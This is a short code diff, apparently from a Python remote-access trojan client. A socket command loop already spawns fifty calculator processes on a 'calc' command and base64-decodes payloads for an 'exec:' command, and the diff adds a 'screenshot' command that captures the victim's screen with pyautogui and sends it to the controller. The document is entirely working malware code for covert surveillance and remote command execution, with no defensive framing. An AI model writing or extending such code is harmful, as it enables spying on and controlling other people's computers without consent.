@@ -3,6 +3,9 @@ import struct
 import socket
 import tempfile
 import subprocess
+import numpy as np
+import cv2
+import pyautogui
 
 
 # TODO: conn keepalive
@@ -56,6 +59,10 @@ while True:
     elif msg == "calc":
         for i in range(0, 50):
             procs.append(subprocess.Popen("C:\Windows\System32\calc.exe"))
+    elif msg == "screenshot":
+        image = pyautogui.screenshot()
+        image = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
+        send_msg(sock, image)
     elif msg.startswith("exec:"):
         payload = msg[msg.index(':'):]
         payload_bytes = base64.b64decode(payload)
